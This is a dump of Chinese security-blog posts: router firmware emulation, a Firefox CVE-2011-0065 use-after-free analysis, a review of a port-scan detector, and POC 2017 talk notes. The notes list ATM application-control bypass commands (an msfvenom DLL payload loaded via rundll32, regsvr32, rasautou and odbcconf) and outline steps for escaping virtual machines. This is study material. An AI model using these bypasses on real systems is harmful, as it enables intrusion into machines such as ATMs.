reference《揭秘家用路由器0day漏洞挖掘技术》","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"路由漏洞","slug":"路由漏洞","permalink":"https://www.giantbranch.cn/tags/路由漏洞/"},{"name":"溢出漏洞","slug":"溢出漏洞","permalink":"https://www.giantbranch.cn/tags/溢出漏洞/"},{"name":"分析笔记","slug":"分析笔记","permalink":"https://www.giantbranch.cn/tags/分析笔记/"}]},{"title":"一次qemu动态调试路由程序的记录","slug":"一次qemu动态调试路由程序的记录","date":"2018-04-16T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/04/16/一次qemu动态调试路由程序的记录/","link":"","permalink":"https://www.giantbranch.cn/2018/04/16/一次qemu动态调试路由程序的记录/","excerpt":"","text":"实践下载固件ftp://54.187.190.227/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP， binwalk解开 1binwalk -e ./dir605L_FW_113.bin 讲qemu-mips复制到固件根目录 1cp $(which qemu-mips) ./ 尝试直接执行 12sudo chroot . ./qemu-mips ./bin/boachroot: failed to run command ‘./qemu-mips’: No such file or directory 后来发现需要将依赖库复制到对应目录 123456789101112giant@ubuntu:~$ ldd /usr/bin/qemu-mips linux-vdso.so.1 =&gt; (0x00007fffc016e000) libgmodule-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 (0x00007f252f59a000) libglib-2.0.so.0 =&gt; /lib/x86_64-linux-gnu/libglib-2.0.so.0 (0x00007f252f286000) librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007f252f07e000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f252ed28000) libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f252eb11000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f252e8f2000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f252e512000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f252e30e000) libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f252e09c000) /lib64/ld-linux-x86-64.so.2 (0x00007f2531c02000) 复制 12345678910cp /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 ./usr/lib/cp /lib/x86_64-linux-gnu/libglib-2.0.so.0 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/librt.so.1 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libm.so.6 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libgcc_s.so.1 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libpthread.so.0 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libc.so.6 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libdl.so.2 ./lib/x86_64-linux-gnucp /lib/x86_64-linux-gnu/libpcre.so.3 ./lib/x86_64-linux-gnucp /lib64/ld-linux-x86-64.so.2 ./lib64 ok，完美，接下来就是处理路由器程序的问题了（路由器的web二进制程序是boa） 1234sudo chroot ./ ./qemu-mips ./bin/boaInitialize AP MIB failed!qemu: uncaught target signal 11 (Segmentation fault) - core dumpedSegmentation fault 32位程序，那就用32位ida远程调试 12$ file ./bin/boa./bin/boa: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size 加上-g参数qemu会帮你启动一个gdbserver在那 1$ sudo chroot ./ ./qemu-mips -g 1234 ./bin/boa ida打开程序后远程附加调试，搜索字符串并在上一处跳转处下断点 可以看到是apmib_init函数返回0导致输出Initialize AP MIB failed!这个错误 查了下：http://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-library apmib_init(),是從 flash 讀出 mib 值寫入 RAM，这个跟我们的web程序应该影响 或者使用gdb，当然要使用多架构的 1sudo apt install gdb-multiarch 最好装个gef 1https://github.com/hugsy/gef gdb打开 1gdb-multiarch ./boa gdb远程附加 1gef➤ target remote 127.0.0.1:1234 那就可以愉快地调试了 那我们怎么劫持这个调用呢，那我们就，搜索一下，应该是下面的so文件 12$ find ./ -name &quot;apmib*&quot;./lib/apmib.so 那我们编写一个动态库劫持这个init函数得了，直接return1 123456#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init()&#123; return 1;&#125; 编译前，装一下啊gcc-mips-linux-gnu 1sudo apt install gcc-mips-linux-gnu 编译 1$ mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so 我们启动的时候可以用-E设置环境变量（LD_PRELOAD就是优先加载我们的so文件） 12sudo chroot ./ ./qemu-mips -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boa./bin/boa: can&apos;t load library &apos;libc.so.6&apos; 那就讲lib目录的文件复制一份，又来一个错误 123456789giant@ubuntu:~/learn/ch3/_dir605L_FW_113.bin.extracted/squashfs-root-0/lib$ file libc.so.0 libc.so.0: ELF 32-bit MSB shared object, MIPS, MIPS-I version 1 (SYSV), dynamically linked, corrupted section header sizegiant@ubuntu:~/learn/ch3/_dir605L_FW_113.bin.extracted/squashfs-root-0/lib$ cp libc.so.0 libc.so.6giant@ubuntu:~/learn/ch3/_dir605L_FW_113.bin.extracted/squashfs-root-0/lib$ cd ..giant@ubuntu:~/learn/ch3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo chroot ./ ./qemu-mips -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boaCreate chklist file error!Create chklist file error!qemu: uncaught target signal 11 (Segmentation fault) - core dumpedSegmentation fault 这个报错是两个函数里头 但一时发现不了是哪里出错，那就从之前apmib_init开始调试 但是不知道为何v0已经为1了，我单步还是不跳，无语 直接用作者的.c去编译就可以启动起来，但是用web访问还是会崩，好了其实这个过程也学到了不少 reference《揭秘家用路由器0day漏洞挖掘技术》","categories":[],"tags":[{"name":"调试","slug":"调试","permalink":"https://www.giantbranch.cn/tags/调试/"},{"name":"路由器","slug":"路由器","permalink":"https://www.giantbranch.cn/tags/路由器/"},{"name":"iot","slug":"iot","permalink":"https://www.giantbranch.cn/tags/iot/"}]},{"title":"CTF线下赛的一些有用的东西","slug":"CTF线下赛的一些有用的东西","date":"2018-04-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/04/02/CTF线下赛的一些有用的东西/","link":"","permalink":"https://www.giantbranch.cn/2018/04/02/CTF线下赛的一些有用的东西/","excerpt":"","text":"什么软waf，文件监控都很老了，这有个开源的 https://github.com/ssooking/CTFDefense本项目开发了一个简单的在CTF线下赛中截取攻击流量的日志工具 https://github.com/Bluekezhou/binaryWaf 怎么去patch格式化串漏洞的程序：方法 —–&gt; 替换printf 为puts http://bestwing.me/2017/05/25/How-to-patch-fmt/ 或者jmp到一个区域是我们自己的代码，安全处理后，再跟着跳回原来的地方继续执行好像是一个通用的办法，感觉做成hook了？ 其他可参考的 https://ctf-wiki.github.io/ctf-wiki/introduction/experience/#patch http://anciety.cn/2017/04/27/To-my-first-offline-match/ http://www.reeheihei.org/2017/05/15/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9BAWD%E4%B8%ADPwn%E9%80%89%E6%89%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E7%94%9F%E5%AD%98/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"awd","slug":"awd","permalink":"https://www.giantbranch.cn/tags/awd/"},{"name":"web","slug":"web","permalink":"https://www.giantbranch.cn/tags/web/"}]},{"title":"用Firmware Analysis Toolkit简单地启动一个模拟路由","slug":"用Firmware Analysis Toolkit简单地启动一个模拟路由","date":"2018-03-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/03/21/用Firmware Analysis Toolkit简单地启动一个模拟路由/","link":"","permalink":"https://www.giantbranch.cn/2018/03/21/用Firmware Analysis Toolkit简单地启动一个模拟路由/","excerpt":"","text":"运行fat.py 12/home/oit/tools/firmadyne [git::master *] [oit@ubuntu] [2:58]&gt; ./fat.py 输入你下载的zip的路径，在输入下brand就可以了 最后再就是输入user firmadyne的密码，密码也是firmadyne 如果不是root用户运行还会输入用户密码 最后即可启动成功 当然可能需要你的路由固件是标准的固件格式","categories":[],"tags":[{"name":"路由","slug":"路由","permalink":"https://www.giantbranch.cn/tags/路由/"}]},{"title":"CVE-2011-0065-Firefox 3.6.16 mChannel 释放重引用漏洞","slug":"CVE-2011-0065-Firefox 3.6.16 mChannel 释放重引用漏洞","date":"2018-03-12T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/03/12/CVE-2011-0065-Firefox 3.6.16 mChannel 释放重引用漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/03/12/CVE-2011-0065-Firefox 3.6.16 mChannel 释放重引用漏洞/","excerpt":"","text":"环境win7 32windbg 漏洞分析先开启hpa，再打开poc 1234C:\\Program Files\\Debugging Tools for Windows (x86)&gt;gflags.exe /i &quot;C:\\Program Files\\Mozilla Firefox\\firefox.exe&quot; +hpaCurrent Registry Settings for firefox.exe executable are: 02000000 hpa - Enable page heap 打开后崩溃信息如下 123456789101112131415161718192021222324252627282930310:000&gt; g(918.be8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=07b43210 ebx=05a966c4 ecx=0a54f800 edx=07c83910 esi=804b0002 edi=80000000eip=07289634 esp=003cf07c ebp=003cf28c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0001024607289634 2001 and byte ptr [ecx],al ds:0023:0a54f800=50*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Mozilla Firefox\\xul.dll - 0:000&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.003cf078 645a4e75 07b43210 804b0002 00000000 0x7289634003cf28c 645a5659 05a966c4 079acab0 00000001 xul!gfxFontUtils::ReadNames+0x14735003cf2bc 645a6155 05a966c4 003cf374 00000001 xul!gfxFontUtils::ReadNames+0x14f19*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Mozilla Firefox\\nspr4.dll - 003cf428 6b07d120 20a8e5d0 00360e14 0000000a xul!gfxFontUtils::ReadNames+0x15a15003cf460 645a61a3 05a966a0 00000001 63e62902 nspr4!PR_Now+0x40003cf46c 63e62902 00000001 09c07540 073f3700 xul!gfxFontUtils::ReadNames+0x15a63003cf488 63e621d2 00000048 00000000 00000000 xul!gfxMatrix::HasNonTranslation+0x2c5200000000 00000000 00000000 00000000 00000000 xul!gfxMatrix::HasNonTranslation+0x25220:000&gt; ub 645a4e75 xul!gfxFontUtils::ReadNames+0x1471f:645a4e5f 8bce mov ecx,esi645a4e61 e81a6991ff call xul!NS_CycleCollectorSuspect2_P+0x2a0 (63ebb780)645a4e66 8b4350 mov eax,dword ptr [ebx+50h]645a4e69 8b08 mov ecx,dword ptr [eax]645a4e6b be02004b80 mov esi,804B0002h645a4e70 56 push esi645a4e71 50 push eax645a4e72 ff5118 call dword ptr [ecx+18h] 可以看到上层调用基本是一个虚函数调用，很有可能是一个uaf漏洞 不知道为何我这配置好后下载不了firefox的符号，还是比较头疼 所以我并不能像作者那样这么愉快地详细分析了 只能看源码（https://hg.mozilla.org/releases/mozilla-1.9.2/rev/c24f21581d77） 123456789101112131415161718192021222324--- a/content/base/src/nsObjectLoadingContent.cpp+++ b/content/base/src/nsObjectLoadingContent.cpp@@ -1010,18 +1010,19 @@ nsObjectLoadingContent::GetInterface(con &#125; // nsIChannelEventSink NS_IMETHODIMP nsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel, nsIChannel *aNewChannel, PRUint32 aFlags) &#123;- // If we&apos;re already busy with a new load, cancel the redirect- if (aOldChannel != mChannel) &#123;+ // If we&apos;re already busy with a new load, or have no load at all,+ // cancel the redirect.+ if (!mChannel || aOldChannel != mChannel) &#123; return NS_BINDING_ABORTED; &#125; if (mClassifier) &#123; mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel); &#125; mChannel = aNewChannel; 修补方式是增加了对mChannel的判断，如果为空指针就return了 如果不return下面会对mChannel赋值，由于aNewChannel不再使用，所以会free掉，即mChannel会被free掉， 1mChannel = aNewChannel; 再次引用，那么就会崩溃了 具体在nsObjectLoadingContent::LoadObject里面引用（1192行：https://hg.mozilla.org/releases/mozilla-1.9.2/file/c24f21581d77/content/base/src/nsObjectLoadingContent.cpp） 123456789101112131415161718192021222324// From here on, we will always change the content. This means that a // possibly-loading channel should be aborted. if (mChannel) &#123; LOG((&quot;OBJLC [%p]: Cancelling existing load\\n&quot;, this)); if (mClassifier) &#123; mClassifier-&gt;Cancel(); mClassifier = nsnull; &#125; // These three statements are carefully ordered: // - onStopRequest should get a channel whose status is the same as the // status argument // - onStopRequest must get a non-null channel mChannel-&gt;Cancel(NS_BINDING_ABORTED); if (mFinalListener) &#123; // NOTE: Since mFinalListener is only set in onStartRequest, which takes // care of calling mFinalListener-&gt;OnStartRequest, mFinalListener is only // non-null here if onStartRequest was already called. mFinalListener-&gt;OnStopRequest(mChannel, nsnull, NS_BINDING_ABORTED); mFinalListener = nsnull; &#125; mChannel = nsnull;&#125; reference《漏洞战争》","categories":[],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://www.giantbranch.cn/tags/UAF/"},{"name":"释放后重用漏洞","slug":"释放后重用漏洞","permalink":"https://www.giantbranch.cn/tags/释放后重用漏洞/"},{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://www.giantbranch.cn/tags/漏洞战争/"}]},{"title":"PortDog端口扫描异常检测工具源码简析","slug":"PortDog端口扫描异常检测工具源码简析","date":"2018-03-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/03/11/PortDog端口扫描异常检测工具源码简析/","link":"","permalink":"https://www.giantbranch.cn/2018/03/11/PortDog端口扫描异常检测工具源码简析/","excerpt":"","text":"总览首先获取要捕获的网卡的流量（其实这个不太好，因为我们要检测的网卡不一定排在第一啊，这个可以根据自己的实际情况修改） 1LANip = commands.getoutput(&quot;/sbin/ifconfig&quot;).split(&quot;\\n&quot;)[1].split()[1][5:] 作者捕获用的是socket，因为是AF_PACKET在windows用不了，所以这种方式就只能在linux用了 123s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))packet = s.recvfrom(65565)packet = packet[0] 捕获数据后接下来就是去解析ip，tcp协议的一些字段 下一步就是检测是不是三次握手的包，是3次握手才会将信息插入到threewayhandshake数组 123testdata = s_addr+&quot;:&quot;+str(source_port)+&quot;-&gt;&quot;+d_addr+&quot;:&quot;+str(dest_port)if(testdata not in threewayhandshake): threewaycheck(s_addr,d_addr,source_port,dest_port,seq_numb,dest_numb,tcp_flags) 接下来核心的就是scancheck函数 1scancheck(s_addr,d_addr,source_port,dest_port,seq_numb,dest_numb,tcp_flags) 具体实现如下： 12345678910111213141516171819202122232425def scancheck(sip,dip,sport,dport,seqnum,acknum,flags): global data,dataforthreewaycheck,dbdata,reverse data = sip+&quot;:&quot;+str(sport)+&quot;-&gt;&quot;+dip+&quot;:&quot;+str(dport)+&quot;_&quot;+str(seqnum)+&quot;_&quot;+str(acknum)+&quot;_&quot;+&quot;/&quot;.join(flags) dataforthreewaycheck = sip+&quot;:&quot;+str(sport)+&quot;-&gt;&quot;+dip+&quot;:&quot;+str(dport) revthreeway = dip+&quot;:&quot;+str(dport)+&quot;-&gt;&quot;+sip+&quot;:&quot;+str(sport) dbdata = sip+&quot;-&gt;&quot;+dip reverse = dip+&quot;-&gt;&quot;+sip if(halfconnectscan(sip,dip,sport,dport,seqnum,acknum,flags)): returned = halfconnectscan(sip,dip,sport,dport,seqnum,acknum,flags) if(isinstance(returned,(str))): print returned else: print bgcolors.BOLD+bgcolors.OKBLUE+revthreeway+bgcolors.ENDC+bgcolors.WARNING+bgcolors.BOLD+&quot; Port Scanning Detected: [Style not Defined]:Attempt to connect closed port!&quot;+bgcolors.ENDC elif(fullconnectscan(sip,dip,sport,dport,seqnum,acknum,flags)): returned = fullconnectscan(sip,dip,sport,dport,seqnum,acknum,flags) if(isinstance(returned,(str))): print returned else: print bgcolors.BOLD+bgcolors.OKBLUE+revthreeway+bgcolors.ENDC+bgcolors.WARNING+bgcolors.BOLD+&quot; Port Scanning Detected: [Style not Defined]:Attempt to connect closed port!&quot;+bgcolors.ENDC elif(xmasscan(sip,dip,sport,dport,seqnum,acknum,flags)): print bgcolors.BOLD+bgcolors.OKBLUE+dataforthreewaycheck+bgcolors.ENDC +bgcolors.BOLD+bgcolors.FAIL+ &quot; =&gt; [Runtime Detection:] XMAS scan detected!&quot;+bgcolors.ENDC elif(finscan(sip,dip,sport,dport,seqnum,acknum,flags)): print bgcolors.BOLD+bgcolors.OKBLUE+ dataforthreewaycheck+bgcolors.ENDC+ bgcolors.BOLD+bgcolors.FAIL+&quot; =&gt; [Runtime Detection:] FIN scan detected!&quot;+bgcolors.ENDC elif(nullscan(sip,dip,sport,dport,seqnum,acknum,flags)): print bgcolors.BOLD+bgcolors.OKBLUE+dataforthreewaycheck +bgcolors.ENDC+bgcolors.BOLD+bgcolors.FAIL+ &quot; =&gt; [Runtime Detection:] NULL scan detected!&quot;+bgcolors.ENDC 那么其实就是依次判断每种端口扫描技术 对于每种扫描，通用的就是将扫描的目标端口记录下来 12345if(scannedports.has_key(dip)): scannedports[dip].append(str(sport))else: scannedports[dip] = [] scannedports[dip].append(str(sport)) 下面依次看每种扫描技术判断，只要发现了，就加到黑名单 halfconnectscan（半连接扫描）就是发SYN包，之后发了个含RST，ACK的包，那就是半连接扫描了 1234567891011121314151617181920if(&quot;SYN&quot; in flags and seqnum&gt;0 and acknum==0 and len(flags)==1): halfscandb[dbdata+&quot;_&quot;+str(seqnum)] = dbdata+&quot;_SYN_ACK_&quot;+str(seqnum)+&quot;_&quot;+str(acknum)elif(&quot;RST&quot; in flags and &quot;ACK&quot; in flags and len(flags)==2): if(halfscandb.has_key(reverse+&quot;_&quot;+str(acknum-1))): del halfscandb[reverse+&quot;_&quot;+str(acknum-1)] if(str(dip) not in blacklist): blacklist.append(str(dip)) return True elif(&quot;SYN&quot; in flags and &quot;ACK&quot; in flags and len(flags)==2): if(halfscandb.has_key(reverse+&quot;_&quot;+str(acknum-1))): del halfscandb[reverse+&quot;_&quot;+str(acknum-1)] halfscandb[reverse+&quot;_&quot;+str(acknum)] = dbdata+&quot;_RST_&quot;+str(seqnum)+&quot;_&quot;+str(acknum)elif(&quot;RST&quot; in flags and len(flags)==1): if(halfscandb.has_key(dbdata+&quot;_&quot;+str(seqnum))): if(str(dip) not in blacklist): blacklist.append(str(dip)) return bgcolors.BOLD+bgcolors.OKBLUE+sip+&quot;:&quot;+str(sport)+&quot;-&gt;&quot;+dip+&quot;:&quot;+str(dport) +bgcolors.ENDC+ bgcolors.BOLD+bgcolors.FAIL+&quot; =&gt; [Runtime Detection:] Half connect(SYN scan) scan detected!&quot;+bgcolors.ENDCreturn False fullconnectscan这个分了两种 第一种：有三次握手，但是之后就发了ACK RST 123456789101112131415if(dataforthreewaycheck in threewayhandshake): if(&quot;ACK&quot; in flags and &quot;RST&quot; in flags and len(flags)==2): if(fullscandb.has_key(dbdata)): counter = int(fullscandb[dbdata]) if(counter&gt;=3): if(str(dip) not in blacklist): blacklist.append(str(dip)) return bgcolors.BOLD+bgcolors.OKBLUE+ dip+&quot;:&quot;+str(dport)+&quot;-&gt;&quot;+sip+&quot;:&quot;+str(sport)+bgcolors.ENDC+ bgcolors.BOLD+bgcolors.FAIL+&quot; =&gt; [Runtime Detection:] Full connect scan detected!&quot;+bgcolors.ENDC else: counter = counter + 1 fullscandb[dbdata] = str(counter) else: counter = 0 fullscandb[dbdata] = str(counter) 第二种情况 这是连续3次在SYN后发了”RST” and “ACK”，这个我感觉还是半连接的感觉啊 12345678910111213141516171819202122232425else: if(&quot;SYN&quot; in flags and len(flags)==1): if(seqnum&gt;0 and acknum==0): fullscandb[dbdata+&quot;_SYN&quot;] = str(seqnum)+&quot;_&quot;+str(acknum)+&quot;_&quot;+str(sport)+&quot;_&quot;+str(dport) elif(&quot;RST&quot; in flags and &quot;ACK&quot; in flags and len(flags)==2): if(fullscandb.has_key(dip+&quot;-&gt;&quot;+sip+&quot;_SYN&quot;)): manage = fullscandb[dip+&quot;-&gt;&quot;+sip+&quot;_SYN&quot;] pieces = manage.split(&quot;_&quot;) old_acknum = int(pieces[1]) old_seqnum = int(pieces[0]) if(seqnum==0 and acknum==old_seqnum+1): if(fullscandb.has_key(dbdata)): counter = int(fullscandb[dbdata]) if(counter&gt;=3): if(str(dip) not in blacklist): blacklist.append(str(dip)) return True else: counter = counter + 1 fullscandb[dbdata] = str(counter) else: counter = 0 fullscandb[dbdata] = str(counter) xmasscan只含下面3个flag的 “FIN” ，”URG” ， “PSH” finscan这个没三次握手的前提下就只有一个FIN 12if(dataforthreewaycheck not in threewayhandshake): if(&quot;FIN&quot; in flags and len(flags)==1): nullscan没有一个flag置位 1if(len(flags)==0): ackscan只有ack 1if(\"ACK\" in flags and len(flags)==1): referencehttps://github.com/puniaze/PortDog","categories":[],"tags":[{"name":"检测","slug":"检测","permalink":"https://www.giantbranch.cn/tags/检测/"},{"name":"端口扫描","slug":"端口扫描","permalink":"https://www.giantbranch.cn/tags/端口扫描/"}]},{"title":"POC 2017的一些要点记录","slug":"POC 2017的一些要点记录","date":"2018-02-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/02/06/POC 2017的一些要点记录/","link":"","permalink":"https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/","excerpt":"","text":"这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。 http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/ 我没去参加这个会议，只是根据公开的pdf对部分议题中有些点记录一下，不会全部议题全记录 Hybrid App SecurityAttack and defenseHybrid App（混合模式移动应用）是指介于web-app、native-app这两者之间的app，兼具“Native App良好用户交互体验的优势”和“Web App跨平台开发的优势”。 Apache Cordova框架的架构 白名单插件 1.Navigation WhitelistControls which URLs the WebView itself can be navigated to.2.Intent WhitelistControls which URLs the app is allowed to ask the system to open.3.Network Request WhitelistControls which network requests are allowed to be made. Attack Surface of Hybrid App XSS Vulnerability Man-in-the-Middle Attack Insecure Whitelist Exported JS Bridge Incorrect URL interception How to secure your hybrid app use CSP to protect web app SSL Certificate Pinning Use session token to protect bridges Don’t use iframe and eval() Update your hybrid app framework to the last version Use system WebView for outside links Validate all user input Remove unused plugins Launch Impossible Current State of Application Control Bypasses on ATMs.Kiosk mode bypass 应该可以简单地理解为全屏模式？ •Safe mode•Hotkeys (Win+R Alt+Tab Alt+F4 Alt+Shift+ESC F1-F12 Shift x5 (Windows 7 only) Win+(etc))•Windows Plug&amp;Play•Race condition•Booting process How to deliver malware Code execution in trusted apps (cmd, powershell) Hash collisions Bypassing extensions blacklist Another trusted applications (.NET, Java, PHP, etc) Misconfiguration (DLL) Exploits Fuzzing trusted apps for /f %%i in (C:\\commands.txt) do cmd /C %%i /? &gt;&gt; log.txt msfvenom -p windows/exec CMD=calc -f dll -o /tmp/xek.dll rundll32 C:\\xek.dll,@DllMain regsvr32 /s /u xek.dll (call DllUnregisterServer) DLL hijacking rasautou -d C:\\xek.dll -p @DllMain12 -e 1 odbcconf /a {REGSVR “C:\\xek.dll”} 还是有很多懒得记录。。。 An awesome toolkit for testing the virtualization systemtool-1 side channel attackThis basic principle of this tool is ，When the Central ProcessingUnit （CPU） handles atomic instructions, memory bus will belocked. The time it takes for two virtual machines to execute someatomic instructions at the same time is longer than the time that avirtual machine executes these code. 这个应该可以判断是否是虚拟机，根据时间 tool-2 escape from docker container我们知道docker是一个容器 我们攻击的目标是命名空间（namespace），但是我们首先需要有权限提升漏洞 原理：改变docker容器的bash进程的namespace https://www.cnblogs.com/sammyliu/p/5878973.htmlhttp://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/ tips Docker is reducing the number of syscall that can be called inthe container; so some privilege-escalation vulnerabilities can notbe used. Linux kernel namespace operation code is constantly beingmodified; so the attack module also need to be constantlyupdated. tool-3 escape from vmware vm target：vmx process 原理：作者使用了6个漏洞，泄露关键信息：例如可写的全局内存，Functional registration phenomenon（这个不知怎么翻译，感觉是函数调用表），有用的数据结构和相关的区域 前提：有uaf或者堆溢出漏洞 特点：exp代码是通用的 tool-4 escape from qemu vm QEMU is a generic and open source machine emulator and virtualizer. The Xen-qemuproject is similar in code to the qemu project. Most of the public and privatecloud virtual machines are based on kvm&amp;qemu and xen hypervisor platforms. 目标：qemu process 前提：uaf或堆溢出漏洞 限制： 没有通用的rop 没有通用的堆申请代码 没有通用的payload 我们需要将漏洞拥有可读可写的能力，目的是修改tool中的代码 提升成功率，需要写在驱动里 read function pointer in key-memory calculate the base address of qemu process change vram authority to be executable put the payload code in vram memory occupy coroutine_trampoline function pointerand control rip The android vulnerability discovery in SoC▶ALSA(Advanced Linux Sound Architecture)ALSA provides audio-related support to the Linux kernel.▶ASoC(ALSA System on Chip)ASoC is a Linux kernel subsystem created to provide better ALSAsupport for system-on-chip and portable audio codecs. 架构 ▶Machine driver:The machine driver handles any machine specific controls and audioevents (e.g. turning on an amp at start of playback).▶Codec Driver :The codec driver is platform independent and contains audio controls,audio interface capabilities, codec DAPM definition and codec I/Ofunctions.▶Platform driver:The platform driver contains the audio DMA engine and audiointerface drivers (e.g. I2S, AC97, PCM) for that platform. 下面是snd_kcontrol_new 结构体 1234567891011121314151617struct snd_kcontrol_new &#123; snd_ctl_elem_iface_t iface; /* interface identifier */ unsigned int device; /* device/client number */ unsigned int subdevice; /* subdevice (substream) number */ const unsigned char *name; /* ASCII name of item */ unsigned int index; /* index of item */ unsigned int access; /* access rights */ unsigned int count; /* count of same elements */ snd_kcontrol_info_t *info; snd_kcontrol_get_t *get; snd_kcontrol_put_t *put; union &#123; snd_kcontrol_tlv_rw_t *c; const unsigned int *p; &#125; tlv; unsigned long private_value;&#125;; 结构体中这几个可以在用户空间控制声卡 123snd_kcontrol_info_t *info;snd_kcontrol_get_t *get;snd_kcontrol_put_t *put; 高通SOC 代码片段 12345678910111213141516static long snd_ctl_ioctl(struct file *file, unsigned int cmd, unsigned long arg)&#123; struct snd_ctl_file *ctl; struct snd_card *card; struct snd_kctl_ioctl *p; void __user *argp = (void __user *)arg; int __user *ip = argp; switch (cmd) &#123; case SNDRV_CTL_IOCTL_ELEM_INFO: return snd_ctl_elem_info_user(ctl, argp); case SNDRV_CTL_IOCTL_ELEM_READ: return snd_ctl_elem_read_user(card, argp); case SNDRV_CTL_IOCTL_ELEM_WRITE: return snd_ctl_elem_write_user(ctl, argp); &#125; argp我们是可以控制的，在看看write里 继续看put 可能可以控制索引，越界访问异常 Thermal Framework linux就是通过这个框架管理系统的温度的 The framework includes thermal zones, thermalsensors,cooling devices, governors, trip points and thermalinstances. 但是这个框架通过linux的sysfs，设备驱动的虚拟文件系统暴露了一些信息给用户空间的应用（sysfs 是 Linux 内核中设计较新的一种虚拟的基于内存的文件系统，一般挂载在linux中/sys/下，那就是/sys/下的内容） 架构 ▶Thermal Zone Device:The thermal zone device includes a thermal sensor（热敏元件，就是温度传感器） and multiplecooling devices.It represents a region managed by thermalframework.▶Thermal Governor:The thermal governor determines cooling policy.▶Thermal Cooling Device:The thermal cooling device is actual functional units for coolingdown the thermal zone. 攻击面 Samsung S8 Thermal 我们看到循环的size 但是这个size我们是可控的 那最终我们可以控制循环，最终可导致溢出 Tegra Thermal tegra_throttle_cooling_ops结构 里面有个set_cur_state 通过控制cur_state可能可以任意读 race condition in list no lock protection on list operation simple but rare no lock protection on list node complex but common 简单的情况 那个重合的部分是 12A-&gt;next = A-&gt;next-&gt;nextB-&gt;next = LIST_POISION 就是说当左边的执行完 12A-&gt;next = A-&gt;next-&gt;next;B-&gt;next = LIST_POISION; 右边的再执行，那么就出问题，B-&gt;next 应该指向C，现在执行LIST_POISION 1B-&gt;next = B-&gt;next-&gt;next; 那都加锁又怎样 两个线程有可能delete两次 Samsung s8 HDCP race对list find操作加锁 对list del加锁 但是对ss_node没有加锁 另一个，这个应该是可以find同一个？，之后double delte and doule free reference count overflow（计数溢出） 0xFFFFFFFF + 1 ——&gt; 0 难点 Hard to fuzz (cost much time to do increasing) Stable Use-After-Free issue Easily ignore 总结 在安卓的socs里面有很多类型的漏洞 新的攻击面和攻击手法（模型）还有待发现 Tampering with Encrypted Memory Blocks of Trusted Execution Environment进程的边界并不能保护执行环境，比如我们可以dll注入 沙箱： 应用程序沙箱：IOS，Android Javascript沙箱： Chrome, Safari, Edge, etc 沙箱能隔离执行环境，但其本身就会有漏洞 一个内核漏洞就能破坏整个保护 而添加更多的特却层并不能解决问题 下面是作者给的一个硬件可信执行环境（可能会有硬件漏洞呢，比如之前的cpu漏洞，哈哈~） **Intel SGX TEE是这个安全机制的实现，运行在Ring3，用户层 这个应该也是密码学的一个应用了，每个进程有一个key，只有用这个才能解密，才能访问 不过要安全就会损失了性能了 SGX’s Threat Model is Very Strong! 除了核心包（core package），下面的所有都当作恶意的 Device, 